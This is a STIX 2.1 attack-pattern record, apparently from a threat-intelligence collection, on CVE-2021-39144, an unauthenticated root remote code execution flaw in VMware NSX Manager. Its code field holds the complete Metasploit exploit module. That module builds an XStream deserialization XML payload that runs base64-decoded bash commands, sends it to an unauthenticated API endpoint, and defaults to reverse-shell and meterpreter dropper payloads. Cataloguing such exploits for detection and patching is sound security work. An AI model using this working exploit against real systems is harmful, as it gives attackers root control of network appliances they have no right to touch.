{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3c1e23fa-a43f-4add-8afa-137a1d448dd2",
    "created": "2024-08-14T16:59:55.742931Z",
    "modified": "2024-08-14T16:59:55.742935Z",
    "name": "VMware NSX Manager XStream unauthenticated RCE",
    "description": " VMware Cloud Foundation (NSX-V) contains a remote code execution vulnerability via XStream open source library. VMware has evaluated the severity of this issue to be in the Critical severity range with a maximum CVSSv3 base score of 9.8. Due to an unauthenticated endpoint that leverages XStream for input serialization in VMware Cloud Foundation (NSX-V) a malicious actor can get remote code execution in the context of 'root' on the appliance. VMware Cloud Foundation 3.x and more specific NSX Manager Data Center for vSphere up to and including version 6.4.13 are vulnerable to Remote Command Injection.  This module exploits the vulnerability to upload and execute payloads gaining root privileges.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144.rb",
            "external_id": "vmware_nsxmgr_xstream_rce_cve_2021_39144.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-39144"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2022-0027.html"
        },
        {
            "source_name": "reference",
            "url": "https://kb.vmware.com/s/article/89809"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/ngprN6bu76/cve-2021-39144"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware NSX Manager XStream unauthenticated RCE',\n        'Description' => %q{\n          VMware Cloud Foundation (NSX-V) contains a remote code execution vulnerability via XStream open source library.\n          VMware has evaluated the severity of this issue to be in the Critical severity range with a maximum CVSSv3 base score of 9.8.\n          Due to an unauthenticated endpoint that leverages XStream for input serialization in VMware Cloud Foundation (NSX-V),\n          a malicious actor can get remote code execution in the context of 'root' on the appliance.\n          VMware Cloud Foundation 3.x and more specific NSX Manager Data Center for vSphere up to and including version 6.4.13\n          are vulnerable to Remote Command Injection.\n\n          This module exploits the vulnerability to upload and execute payloads gaining root privileges.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die-gr3y', # metasploit module author\n          'Sina Kheirkhah', # Security researcher (Source Incite)\n          'Steven Seeley' # Security researcher (Source Incite)\n        ],\n        'References' => [\n          ['CVE', '2021-39144'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2022-0027.html'],\n          ['URL', 'https://kb.vmware.com/s/article/89809'],\n          ['URL', 'https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html'],\n          ['URL', 'https://attackerkb.com/topics/ngprN6bu76/cve-2021-39144']\n        ],\n        'DisclosureDate' => '2022-10-25',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix (In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :in_memory,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'curl', 'printf' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n  end\n\n  def check_nsx_v_mgr\n    return send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'login.jsp')\n    })\n  rescue StandardError => e\n    elog(\"#{peer} - Communication error occurred: #{e.message}\", error: e)\n    fail_with(Failure::Unknown, \"Communication error occurred: #{e.message}\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    b64 = Rex::Text.encode_base64(cmd)\n    random_uri = rand_text_alphanumeric(4..10)\n    xml_payload = <<~XML\n      <sorted-set>\n        <string>foo</string>\n        <dynamic-proxy>\n          <interface>java.lang.Comparable</interface>\n          <handler class=\"java.beans.EventHandler\">\n            <target class=\"java.lang.ProcessBuilder\">\n              <command>\n                <string>bash</string>\n                <string>-c</string>\n                <string>echo #{b64} &#x7c; base64 -d &#x7c; bash</string>\n              </command>\n            </target>\n            <action>start</action>\n          </handler>\n        </dynamic-proxy>\n      </sorted-set>\n    XML\n\n    return send_request_cgi({\n      'method' => 'PUT',\n      'ctype' => 'application/xml',\n      'uri' => normalize_uri(target_uri.path, 'api', '2.0', 'services', 'usermgmt', 'password', random_uri),\n      'data' => xml_payload\n    })\n  rescue StandardError => e\n    elog(\"#{peer} - Communication error occurred: #{e.message}\", error: e)\n    fail_with(Failure::Unknown, \"Communication error occurred: #{e.message}\")\n  end\n\n  # Checking if the target is potential vulnerable checking the http title \"VMware Appliance Management\"\n  # that indicates the target is running VMware NSX Manager (NSX-V)\n  # All NSX Manager (NSX-V) unpatched versions, except for 6.4.14, are vulnerable\n  def check\n    print_status(\"Checking if #{peer} can be exploited.\")\n    res = check_nsx_v_mgr\n    return CheckCode::Unknown('No response received from the target!') unless res\n\n    html = res.get_html_document\n    html_title = html.at('title')\n    if html_title.nil? || html_title.text != 'VMware Appliance Management'\n      return CheckCode::Safe('Target is not running VMware NSX Manager (NSX-V).')\n    end\n\n    CheckCode::Appears('Target is running VMware NSX Manager (NSX-V).')\n  end\n\n  def exploit\n    case target['Type']\n    when :in_memory\n      print_status(\"Executing #{target.name} with #{payload.encoded}\")\n      execute_command(payload.encoded)\n    when :linux_dropper\n      print_status(\"Executing #{target.name}\")\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-10-25",
    "x_mitre_platforms": [
        "linux'"
    ]
}